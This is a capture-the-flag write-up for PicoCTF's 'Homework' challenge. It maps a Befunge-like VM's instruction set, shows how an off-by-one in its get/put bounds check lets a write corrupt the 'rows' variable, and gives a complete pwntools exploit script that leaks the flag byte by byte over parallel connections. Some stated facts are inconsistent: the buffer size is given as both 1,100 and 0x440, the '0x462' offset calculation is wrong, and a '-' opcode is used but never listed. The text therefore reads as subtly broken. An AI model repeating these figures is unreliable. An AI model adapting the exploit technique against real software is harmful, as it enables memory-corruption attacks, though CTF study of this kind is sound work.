---
title: "PicoCTF: Homework"
date: 06-25-2025
excerpt: PicoCTF Writeup
cover: ../uploads/cover_picohomework.jpg
tags: binary-exploitation, reverse-engineering
---

Welcome back to my Writeup! Today I'll walk through how I solved **Homework**, a Binary Exploitation challenge from PicoCTF. This is the most involved writeup I've published so far, so I've tried to slow down and explain *why* each step works, not just *what* I typed. Grab a coffee — let's dive in.

## The Challenge

The solve count on this one tells the story: very few people finished it, and there were no hints to lean on. That meant the entire vulnerability had to be found from scratch by reading the binary itself, with no shortcuts.

![PicoCTF Homework challenge page](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2Fcdn-images-1.medium.com%2Fmax%2F800%2F1*KNxAKk88eMZ3cCX6EdodvQ.png&width=768&dpr=3&quality=100&sign=b82ef742&sv=2)

## Step 1: Understanding the Big Picture in Ghidra

The binary isn't stripped, which is a huge gift — it means every global variable keeps its original name in the disassembly (`flag`, `board`, `pcx`, `pcy`, `stack`, `sn`, and so on). Without symbol names, this challenge would have taken far longer just to map out.

Reading `main`, three things stood out immediately:

1. **The flag is loaded into memory up front.** A string that looks like the flag format gets copied into a global variable called `flag` before anything else happens. This is important: we don't need to trigger a shell or read a file — the secret is *already sitting in the process's memory*. The whole challenge becomes "how do I get the program to leak bytes it already holds," not classic shellcode-style exploitation.
2. **A 1,100-byte buffer called `board` is allocated.** The first several lines of our input are copied into the start of this buffer.
3. **A function called `step` runs in a loop until it returns 0.** Everything interesting happens inside `step`, so that's where the real reverse engineering begins.

## Step 2: Recognizing the Program as a Tiny Virtual Machine

The first time I opened `step` in Ghidra, the sheer size of the disassembly was intimidating — long enough that I'd actually abandoned the challenge on an earlier attempt.

![Disassembly of the step function](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2Fcdn-images-1.medium.com%2Fmax%2F800%2F1*1Z6ISsPZuJybijii4S4Pdg.png&width=768&dpr=3&quality=100&sign=742228b&sv=2)

The trick that unlocked it was noticing a pattern: `step` reads one character from `board[pcy][pcx]`, then runs a giant `switch` statement on that character. That's not "some function" — that's a **fetch-decode-execute loop**. In other words, `step` is the interpreter core of a tiny 2D virtual machine, where the `board` buffer is the program being executed, and `(pcx, pcy)` is the instruction pointer's coordinates on that 2D grid.

This is actually a well-known esoteric-language pattern (it closely resembles **Befunge**, a language where the "instruction pointer" literally walks around a 2D grid of characters). Recognizing the pattern let me stop treating every instruction as a mystery and instead treat the challenge as "figure out this VM's instruction set."

### How the instruction pointer moves

Four characters — `> < ^ v` — behave exactly like arrow keys: they set two globals, `dirx` and `diry`, which act as a direction vector. After every instruction executes, the VM advances the instruction pointer using that vector, wrapping around the edges of the board like a torus:

```
pcx = (pcx + dirx + cols) mod cols
pcy = (pcy + diry + rows) mod rows
```

Adding `cols`/`rows` before the modulo is just a standard trick to keep the result non-negative even when `dirx` or `diry` is `-1` — without it, a negative index would come out of the modulo operation in C.

### The stack

Two more globals, `stack` and `sn`, form a classic **operand stack**:

- `stack` is an array of 32-bit integers.
- `sn` is the stack pointer — specifically, the index where the *next* pushed value will go.
- That means the top two elements are always `stack[sn-1]` (top) and `stack[sn-2]` (second from top).

Once I mapped instruction characters to stack operations, the instruction set looked like this:

| Char | Operation |
|------|-----------|
| `0` | push `0` |
| `!` | pop `x`, push `(x == 0)` — logical NOT |
| `+` | pop `x`, pop `y`, push `(y + x)` |
| `*` | pop `x`, pop `y`, push `(y * x)` |
| `:` | duplicate: push `stack[sn-1]` again |
| `\` | swap the top two stack elements |
| `` ` `` | pop `x`, pop `y`, push `(x < y)` |
| `g` | pop `y`, pop `x`; if `0 <= x <= 0x16` and `0 <= y <= 0x32`, push `board[y][x]` |
| `p` | pop `y`, pop `x`, pop `u`; if in-bounds, set `board[y][x] = u` |
| `@` | exit the program |
| `,` | pop `x`, `putchar(x)` |
| `.` | pop `x`, print `x` as a decimal integer |

`g` and `p` are the two that end up mattering most: they let the VM's own program *read and write the board it's running on*, which is exactly the kind of self-modifying access that's worth scrutinizing for bugs.

### Decoding the XOR swap

The `\` (swap) instruction is implemented with three XOR operations instead of a temporary variable, which reads as confusing at first:

```c
stack[sn-1] ^= stack[sn-2];
stack[sn-2] ^= stack[sn-1];
stack[sn-1] ^= stack[sn-2];
```

This is the classic **XOR swap trick**, and it becomes obvious once you remember one property of XOR: `x ^ x = 0`, and XOR-ing with the same value twice cancels itself out (it's its own inverse). Walking through it with `a = stack[sn-1]` and `b = stack[sn-2]`:

1. `a = a ^ b`
2. `b = b ^ a` → substituting, `b = b ^ (a ^ b) = a` (the two `b`s cancel)
3. `a = a ^ b` → substituting the *new* `b`, `a = (a ^ b) ^ a = b` (the two `a`s cancel)

After three lines, `a` and `b` have swapped values without ever needing a third variable. It's a neat compiler-level optimization, but it's exactly the kind of thing that looks like "line noise" in a disassembly listing until you recognize the pattern.

## Step 3: Building Short Input Strings for Arbitrary Numbers

Because the input string that seeds the board has a limited length per line, every character counts. I needed a way to push arbitrary small integers onto the VM's stack using as few characters as possible, combining `0`, `!`, `+`, `*`, and `:` (duplicate).

For example, `0!` means "push 0, then apply NOT" — since `0 == 0` is true, this pushes `1`. From there, duplicating and adding builds up larger numbers cheaply (e.g., `0!:+` duplicates the 1 and adds it to itself to get `2`). Multiplication (`*`) becomes useful once numbers get bigger, since `4 * 4` is shorter to build than `4+4+4+4`.

Working this out by hand for every value up to `0x21` (33) gave a lookup table of minimal-length "push N" strings, which the final exploit script (below) uses as building blocks.

## Step 4: Finding the Vulnerability

With the instruction set fully mapped, I looked hard at every place the program touched memory, since the flag was already sitting in a fixed spot relative to `board`. The `g` (get) and `p` (put) instructions were the obvious candidates, because they're the *only* instructions that let the VM's program touch arbitrary memory.

Their bounds check was:

```c
if (0 <= x && x <= 0x16 && 0 <= y && y <= 0x32) { ... }
```

This is an **off-by-one error**. Both comparisons use `<=` against the *maximum valid index*, but a correctly-sized array of width `0x16` (22) should only allow indices `0` through `0x15` (21) — valid indices are always `0` to `size - 1`. By allowing `x` (and `y`) to equal the width itself, the check permits access one full row/column past the intended boundary.

Doing the math on how far that reaches: the `board` buffer is `0x440` bytes, but with the off-by-one, the largest reachable offset works out to `0x32 * 0x16 * 0x16 = 0x462` bytes — 34 bytes past the buffer's actual end.

That overrun *doesn't* reach the flag directly — the flag sits at offset `0x480` from `board`, still out of reach. But it doesn't need to. Sitting right after `board` in memory is another global variable: `rows`, which is used elsewhere by the VM to decide how many rows of the board are considered "valid" for the `g`/`p` bounds checks. Overwriting `rows` doesn't leak anything on its own — but it **changes the rules of the bounds check itself**, which is the real prize: if we can make `rows` huge, then future `g` (and `p`) instructions will happily read (and write) far outside the original board, including the region where the flag lives.

So the exploit becomes two stages:
1. Use the off-by-one in `p` to write past the true end of `board`, landing exactly on the `rows` variable, and set it to a very large value.
2. With the bounds check now effectively disabled, use `g` to read arbitrary bytes — including the flag — and `,` to print them out.

### Building the write-past-the-end primitive

To hit `rows` exactly, the coordinates fed into `p` need to satisfy:

```
address of rows == address of board + (0x32 * 0x16)
```

Since `p` pops `y`, then `x`, then `u` (the value to write), the stack needs `u`, `x`, `y` pushed in that order before executing `p`.

To maximize `rows`, the string `00!-` is useful: it pushes `0`, then `1` (via `0!`), then subtracts them as `0 - 1`. Because these are unsigned 32-bit values, that underflows to `0xffffffff` — the largest value the field can hold. (Note: the writeup's step-by-step math describes this as "pushing 0 and 1, then subtracting to get 0-1, which becomes 0xffffffff" — an all-1s bit pattern is the natural result of unsigned underflow by one.)

Getting the *coordinates* right took more work, since the target offset (`0x32 * 0x16`, i.e., 50 × 22) doesn't have as short a "push N" shortcut as the small numbers in the earlier table. Squaring 7 (`0!::+::+++` pushes 7, then `*` squares it to 49) and adjusting from there got close, but no combination fit within the per-line character budget. So instead of cramming everything onto one line, the payload uses the `>` `<` `^` `v` direction instructions to walk the instruction pointer onto a second line of the board and continue building the value there — trading a single dense line for a short first line plus a continuation line.

Once `rows` is corrupted to a huge value, `g` and `,` are used together — `g` to fetch a byte from deep in memory, `,` to print it as a character — repeated once per byte of the flag.

## Step 5: The Exploit Script

Because each connection to the remote service only reliably leaks one character before the interpreter's loop needs to restart, the exploit opens many parallel connections — one per flag byte — and stitches the results back together. `pwntools` handles the networking, and `ThreadPoolExecutor` runs the connections concurrently so the whole flag comes back quickly instead of one byte at a time in sequence.

```python
#!/usr/bin/env python3
# homework picoCTF Binary Exploitation Challenge
### Author: KuroSh1r0 ###
from pwn import *
from concurrent.futures import ThreadPoolExecutor

# Data codes to push numbers up to 0x21
data_codes = [
    "0", "0!", "0!:+", "0!::++", "0!:+:+", 
    "0!::+:++", "0!:+::++", "0!::+::+++", "0!:+:+:+", 
    "0!::++:*", "0!::+:++:+", "0!:::+:++:++", 
    "0!:+::++:+", "0!::+::++:++", "0!::+::+++:+", 
    "0!::+:++::++", "0!:+:*:*", "0!::+:*:*+", 
    "0!::++:*:+", "0!:::++:*:++", "0!::+:++:+:+", 
    "0!:::+:++:+:++"
]

def assemble_payload(col_index, row_index):
    """
    Builds the payload sent to the target service, by combining the
    fixed setup portion (which corrupts `rows`) with row/column-specific
    'push N' codes that select which flag byte to leak.

    Parameters:
    - col_index (int): Column index used to pick a code from data_codes.
    - row_index (int): Row index used to pick a code from data_codes.

    Returns:
    - payload (bytes): The assembled payload ready to send.
    """
    
    # Fixed prefix: builds the coordinates/value needed to overwrite `rows`
    # via the off-by-one in the `p` instruction.
    initial_payload = b"0!::+::+++:*0!+:00!-v\n"
    
    # Row-specific code, padded out and followed by a write (`p`) plus a
    # direction change so execution continues on the next line.
    formatted_code = f"\\0\\p{data_codes[row_index]:A<14}+v>\n".encode()
    
    # Column-specific code, followed by a read (`g`), print (`,`), then exit.
    target_data = f"{data_codes[col_index]:A<14}\\g,@A>A\n".encode()

    return initial_payload + formatted_code + target_data + b"\n"

def transmit_request(col_index, row_index):
    """
    Opens one connection to the remote service, sends a payload built for
    a specific (col_index, row_index) pair, and returns the leaked byte.

    Parameters:
    - col_index (int): Column index for this request.
    - row_index (int): Row index for this request.

    Returns:
    - last_character (str): The final character of the server's response,
      which is the leaked flag byte for this connection.
    """
    
    connection = remote("mars.picoctf.net", 31689)
    connection.recvline()  # discard the banner

    payload = assemble_payload(col_index, row_index)
    print(payload.decode())

    connection.send(payload)
    
    # The leaked byte is the last character the server sends back.
    return connection.recvall().decode()[-1]

def execute_requests():
    """
    Fires off many parallel connections — one per flag byte — and
    concatenates the results into the full flag.
    """
    
    output = ""
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        task_futures = []
        
        # Row 2 only needs columns 8 through 0x15 (0x16 exclusive).
        for col_index in range(8, 0x16):
            task_futures.append(executor.submit(transmit_request, col_index, 2))
        
        # Rows 3 and 4 need the full column range.
        for col_index in range(0x16):
            task_futures.append(executor.submit(transmit_request, col_index, 3))
        
        for col_index in range(0x16):
            task_futures.append(executor.submit(transmit_request, col_index, 4))

        for future in task_futures:
            output += future.result()

    print("[+] Flag Successfully retrieved! Here it is master:")
    print(output)

if __name__ == "__main__":
    execute_requests()
```

Running this fires off dozens of connections in parallel, each one leaking a single flag character through the corrupted-bounds read primitive, and reassembles them into the full flag:

![Exploit output showing the retrieved flag](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2Fcdn-images-1.medium.com%2Fmax%2F800%2F1*BPNO0fmi3G2KCo6PKQqxeg.png&width=768&dpr=3&quality=100&sign=239752a1&sv=2)

Flag retrieved. Homework, solved.

## Conclusion

This challenge was tough, but it's a great example of how far you can get with patient, methodical reverse engineering rather than any single clever trick. The path here was:

1. **Recognize the pattern.** A big, scary switch statement turned out to be a 2D fetch-decode-execute loop — once I noticed that, the whole binary became "reverse an instruction set," a much more tractable problem than "reverse an arbitrary blob of assembly."
2. **Model the machine.** Mapping out the stack, the instruction pointer, and each opcode's effect turned raw disassembly into a mental simulator I could reason about.
3. **Audit every memory-touching operation.** `g` and `p` were the only instructions that read/wrote arbitrary memory, which made them the natural place to look for a bounds-check mistake — and that's exactly where the off-by-one was hiding.
4. **Turn a small bug into a big primitive.** A single-index overrun couldn't reach the flag directly, but it could reach a *variable that controls the bounds check itself*. Corrupting that variable turned a one-byte overwrite into an arbitrary read.
5. **Automate the leak.** Once the primitive worked once, wrapping it in a loop (and parallelizing across connections) turned "leak one byte" into "leak the whole flag."

If there's one general lesson here, it's that off-by-one errors are dangerous precisely because they're small — a single `<=` where a `<` belongs is easy to miss in review, but it's often enough to reach a variable that controls something far more powerful than the byte itself.
